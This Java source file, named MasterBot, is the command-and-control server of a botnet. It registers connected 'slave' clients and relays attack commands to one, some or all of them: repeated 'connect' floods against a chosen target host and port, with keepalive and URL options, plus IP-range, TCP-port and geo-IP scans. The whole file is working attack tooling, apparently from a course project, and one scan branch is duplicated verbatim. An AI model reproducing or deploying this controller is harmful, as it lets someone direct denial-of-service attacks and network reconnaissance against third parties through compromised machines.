
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

class connectiondetails {
	String hostname;
	String ipaddress;
	int clientport;
	String datestr;
	Socket clientsoc;

	connectiondetails() {
		DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
		Date date = new Date();
		datestr = dateFormat.format(date);
	}

}

public class MasterBot {
	public static ArrayList<connectiondetails> listconndetails = new ArrayList<connectiondetails>();

	public static void main(String[] args) {
		if (args.length != 2) {
			System.out.println("Format MasterBot -p <Portnumber>!! Please check\n");
			System.exit(0);
		} else if (args[0].equals("-p") == true) {
			int portNumber = Integer.parseInt(args[1]);

			try {
				ServerSocket serverSocket = new ServerSocket(portNumber);
				AcceptClient ac = new AcceptClient(serverSocket);
				ac.start();

				while (true) {
					System.out.print(">");
					BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
					String input = reader.readLine();
					if (input.equals("list")) {
						if (listconndetails.isEmpty()) {
							System.out.println("No client connections available to perform attack!!\n");
						} else {
							for (int i = 0; i < listconndetails.size(); i++) {
								System.out.println(listconndetails.get(i).hostname + " "
										+ listconndetails.get(i).ipaddress + " " + listconndetails.get(i).clientport
										+ " " + listconndetails.get(i).datestr);
							}
						}
					} else {
						String[] inputarray = input.split(" ");
						if (inputarray[0].equals("connect")) {
							int numconnections = 1;
							String arg6 = null;
							if (inputarray.length == 6) {
								boolean flag = true;
								try {
									numconnections = Integer.parseInt(inputarray[4]);
								} catch (NumberFormatException ignored) {
									flag = false;
									// System.out.println(
									// "Connection is not a number : Format :
									// connect
									// (IPAddressOrHostNameOfYourSlave|all)
									// (TargetHostName|IPAddress)
									// TargetPortNumber [NumberOfConnections: 1
									// if not specified] [keepalive]");

								}
								if (flag) {
									if (inputarray[5].equals("keepalive")) {
										arg6 = inputarray[5];
										System.out.println(arg6);
									} else {

										boolean isurl = MasterBot.isURLPattern(inputarray[5]);
										if (isurl) {
											arg6 = inputarray[5];
										} else {
											System.out.println(
													"The last argument is not a URL/num connection/keepalive\n");
										}

									}
								}

								else {
									System.out.println(
											"Connection is not a number : Format : connect (IPAddressOrHostNameOfYourSlave|all) (TargetHostName|IPAddress) TargetPortNumber [NumberOfConnections: 1 if not specified] [keepalive]\n");

								}
							}

							if (inputarray.length == 5) {
								boolean flag = false;
								if (inputarray[4].equals("keepalive")) {
									arg6 = inputarray[4];

								} else {
									try {
										numconnections = Integer.parseInt(inputarray[4]);
									} catch (NumberFormatException ignored) {
										// System.out.println(
										// "Connection is not a number and
										// keepalive is not specified: Format :
										// connect
										// (IPAddressOrHostNameOfYourSlave|all)
										// (TargetHostName|IPAddress)
										// TargetPortNumber
										// [NumberOfConnections: 1 if not
										// specified] [keepalive]");
										flag = true;
									}
									if (flag) {
										Boolean isurl = MasterBot.isURLPattern(inputarray[4]);
										if (isurl) {
											arg6 = inputarray[4];
										} else
											System.out.println("The argument is not keepalive/URL\n");
									}
								}

							}
							if (inputarray.length >= 4 && inputarray.length <= 6) {
								int nameipall = isitiphostall(inputarray[1]);

								switch (nameipall) {

								case 1:
									Boolean isclientpresent = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).ipaddress.equals(inputarray[1])) {
											isclientpresent = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											// System.out.println("connect " +
											// inputarray[2] + " " +
											// inputarray[3] + " "
											// + numconnections);
											pw.println("connect " + inputarray[2] + " " + inputarray[3] + " "
													+ numconnections + " " + arg6);
											pw.flush();

										}
									}
									if (!isclientpresent) {
										System.out.println("Client ipaddress is not connected anymore\n");
									}
									break;
								case 2:
									Boolean isclientpresentname = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).hostname.equals(inputarray[1])) {
											isclientpresentname = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("connect " + inputarray[2] + " " + inputarray[3] + " "
													+ numconnections + " " + arg6);
											pw.flush();

										}
									}
									if (!isclientpresentname) {
										System.out.println("Client hostname is not connected anymore\n");
									}
									break;
								case 3:

									for (int i = 0; i < listconndetails.size(); i++) {

										PrintWriter pw = new PrintWriter(new OutputStreamWriter(
												listconndetails.get(i).clientsoc.getOutputStream()));
										pw.println("connect " + inputarray[2] + " " + inputarray[3] + " "
												+ numconnections + " " + arg6);
										pw.flush();

									}
									break;
								}
							} else if (inputarray.length < 4 || inputarray.length > 6) {
								System.out.println(
										"Connect <ip/hostname/all> <targethostname/targetip> <targetport> <optionalmaxcon>.Please check\n");
								// should re-display the command prompt
							}
						}

						else if (inputarray[0].equals("disconnect")) {
							int port = 0;
							if (inputarray.length == 4) {
								port = Integer.parseInt(inputarray[3]);
							}

							if (inputarray.length == 3 || inputarray.length == 4) {
								int nameipall = isitiphostall(inputarray[1]);
								switch (nameipall) {
								case 1:
									Boolean isclientpresent = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).ipaddress.equals(inputarray[1])) {
											isclientpresent = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("disconnect " + inputarray[2] + " " + port);

											pw.flush();

										}
									}
									if (!isclientpresent) {
										System.out.println("Client ipaddress is not connected anymore\n");
									}
									break;
								case 2:
									Boolean isclientpresentname = false;

									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).hostname.equals(inputarray[1])) {
											isclientpresentname = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));

											pw.println("disconnect " + inputarray[2] + " " + port);
											pw.flush();
										}
									}
									if (!isclientpresentname) {
										System.out.println("Client hostname is not connected anymore\n");
									}
									break;
								case 3:
									for (int i = 0; i < listconndetails.size(); i++) {
										PrintWriter pw = new PrintWriter(new OutputStreamWriter(
												listconndetails.get(i).clientsoc.getOutputStream()));
										pw.println("disconnect " + inputarray[2] + " " + port);
										pw.flush();
									}
									break;
								}

							} else if (inputarray.length < 3 || inputarray.length > 4) {
								System.out.println(
										"disonnect <ip/hostname/all> <targethostname/targetip> <optionaltargetport> .Please check\n");
								// should re-display the command prompt

							}
						} else if (inputarray[0].equals("ipscan")) {
							if (inputarray.length == 3) {
								int nameipall = isitiphostall(inputarray[1]);
								switch (nameipall) {

								case 1:
									Boolean isclientpresent = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).ipaddress.equals(inputarray[1])) {
											isclientpresent = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("ipscan " + inputarray[2]);
											pw.flush();

											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();

										}
									}
									if (!isclientpresent) {
										System.out.println("Client ipaddress is not connected anymore\n");
									}
									break;

								case 2:
									Boolean isclientpresentname = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).hostname.equals(inputarray[1])) {
											isclientpresentname = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("ipscan " + inputarray[2]);
											pw.flush();
											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();

										}
									}
									if (!isclientpresentname) {
										System.out.println("Client hostname is not connected anymore\n");
									}
									break;
								case 3:

									for (int i = 0; i < listconndetails.size(); i++) {
										PrintWriter pw = new PrintWriter(new OutputStreamWriter(
												listconndetails.get(i).clientsoc.getOutputStream()));
										pw.println("ipscan " + inputarray[2]);
										pw.flush();
										ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
										cp.start();

									}
									break;
								}
							} else if (inputarray.length != 3) {
								System.out.println(
										"ipscan <ip/hostname/all> <targetiprangestart-targetiprangeend>.Please check\n");

							}

						} else if (inputarray[0].equals("tcpportscan")) {
							if (inputarray.length == 4) {
								int nameipall = isitiphostall(inputarray[1]);
								switch (nameipall) {

								case 1:
									Boolean isclientpresent = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).ipaddress.equals(inputarray[1])) {
											isclientpresent = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("tcpportscan " + inputarray[2] + " " + inputarray[3]);
											pw.flush();
											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();
											

										}
									}
									if (!isclientpresent) {
										System.out.println("Client ipaddress is not connected anymore\n");
									}
									break;

								case 2:
									Boolean isclientpresentname = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).hostname.equals(inputarray[1])) {
											isclientpresentname = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("tcpportscan " + inputarray[2] + " " + inputarray[3]);
											pw.flush();
											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();

										}
									}
									if (!isclientpresentname) {
										System.out.println("Client hostname is not connected anymore\n");
									}
									break;

								case 3:
									for (int i = 0; i < listconndetails.size(); i++) {

										PrintWriter pw = new PrintWriter(new OutputStreamWriter(
												listconndetails.get(i).clientsoc.getOutputStream()));
										pw.println("tcpportscan " + inputarray[2] + " " + inputarray[3]);
										pw.flush();
										ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
										cp.start();

									}
									break;

								}

							} else if (inputarray.length != 4) {
								System.out.println(
										"tcpportscan <ip/hostname/all> <targethost/targetip> <portrangestart-portrangeend>.Please check\n");
								// should re-display the command prompt
							}

						} else if (inputarray[0].equals("tcpportscan")) {
							if (inputarray.length == 4) {
								int nameipall = isitiphostall(inputarray[1]);
								switch (nameipall) {

								case 1:
									Boolean isclientpresent = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).ipaddress.equals(inputarray[1])) {
											isclientpresent = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("tcpportscan " + inputarray[2] + " " + inputarray[3]);
											pw.flush();
											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();

										}
									}
									if (!isclientpresent) {
										System.out.println("Client ipaddress is not connected anymore\n");
									}
									break;

								case 2:
									Boolean isclientpresentname = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).hostname.equals(inputarray[1])) {
											isclientpresentname = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("tcpportscan " + inputarray[2] + " " + inputarray[3]);
											pw.flush();
											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();

										}
									}
									if (!isclientpresentname) {
										System.out.println("Client hostname is not connected anymore\n");
									}
									break;

								case 3:
									for (int i = 0; i < listconndetails.size(); i++) {

										PrintWriter pw = new PrintWriter(new OutputStreamWriter(
												listconndetails.get(i).clientsoc.getOutputStream()));
										pw.println("tcpportscan " + inputarray[2] + " " + inputarray[3]);
										pw.flush();
										ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
										cp.start();

									}
									break;

								}

							} else if (inputarray.length != 4) {
								System.out.println(
										"tcpportscan <ip/hostname/all> <targethost/targetip> <portrangestart-portrangeend>.Please check\n");
								// should re-display the command prompt
							}

						} else if (inputarray[0].equals("geoipscan")) {
							if (inputarray.length == 3) {
								int nameipall = isitiphostall(inputarray[1]);
								switch (nameipall) {

								case 1:
									Boolean isclientpresent = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).ipaddress.equals(inputarray[1])) {
											isclientpresent = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("geoipscan " + inputarray[2]);
											pw.flush();
											
											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();
											

										}
									}
									if (!isclientpresent) {
										System.out.println("Client ipaddress is not connected anymore\n");
									}
									break;

								case 2:
									Boolean isclientpresentname = false;
									for (int i = 0; i < listconndetails.size(); i++) {
										if (listconndetails.get(i).hostname.equals(inputarray[1])) {
											isclientpresentname = true;
											PrintWriter pw = new PrintWriter(new OutputStreamWriter(
													listconndetails.get(i).clientsoc.getOutputStream()));
											pw.println("geoipscan " + inputarray[2]);
											pw.flush();
											
											ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
											cp.start();
											

										}
									}
									if (!isclientpresentname) {
										System.out.println("Client hostname is not connected anymore\n");
									}
									break;
								case 3:

									for (int i = 0; i < listconndetails.size(); i++) {
										PrintWriter pw = new PrintWriter(new OutputStreamWriter(
												listconndetails.get(i).clientsoc.getOutputStream()));
										pw.println("geoipscan " + inputarray[2]);
										pw.flush();
										
										ClientIps cp = new ClientIps(listconndetails.get(i).clientsoc);
										cp.start();
										

									}
									break;
								}
							} else if (inputarray.length != 3) {
								System.out.println(
										"geoipscan <ip/hostname/all> <targetiprangestart-targetiprangeend>.Please check\n");

							}

						}

						else {
							System.out.print("Enter only list,connect,disconnect,ipscan,portscan or geoipscan\n");
						}

					}
				}
			} catch (Exception e) {
				System.out.println(e.getMessage());
			}
		} else {
			System.out.println("Format MasterBot -p <Portnumber>!! Please check\n");
			System.exit(0);
		}
	}

	static int isitiphostall(String inputarray) {
		String ip4Regex = "^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[0-9]{1,2})(\\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[0-9]{1,2})){3}$";

		if (inputarray.matches(ip4Regex)) {
			return 1;
		} else if (inputarray.equals("all")) {
			return 3;
		} else
			return 2;

	}

	static boolean isURLPattern(String urlpattern) {

		if (urlpattern.equals("url=/#q="))
			return true;
		else
			return false;
	}
}

class AcceptClient extends Thread {
	ServerSocket serverSocket;

	AcceptClient(ServerSocket ss) {
		serverSocket = ss;
	}

	public void run() {
		while (true) {
			try {
				Socket clientSocket = serverSocket.accept();
				connectiondetails connc = new connectiondetails();
				connc.clientsoc = clientSocket;
				connc.ipaddress = clientSocket.getInetAddress().getHostAddress();
				connc.hostname = clientSocket.getInetAddress().getHostName();
				connc.clientport = clientSocket.getPort();

				MasterBot.listconndetails.add(connc);

			} catch (IOException e) {
				// TODO Auto-generated catch block
				System.out.println(e.getMessage());
			}
		}

	}
}

class ClientIps extends Thread {
	Socket clisoc;

	ClientIps(Socket ss) {
		clisoc = ss;
	}

	public void run() {
		BufferedReader inputbr;
		try {
			inputbr = new BufferedReader(new InputStreamReader(clisoc.getInputStream()));
			String inputfromserver = inputbr.readLine();
			System.out.println(inputfromserver + "\n");

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}
}
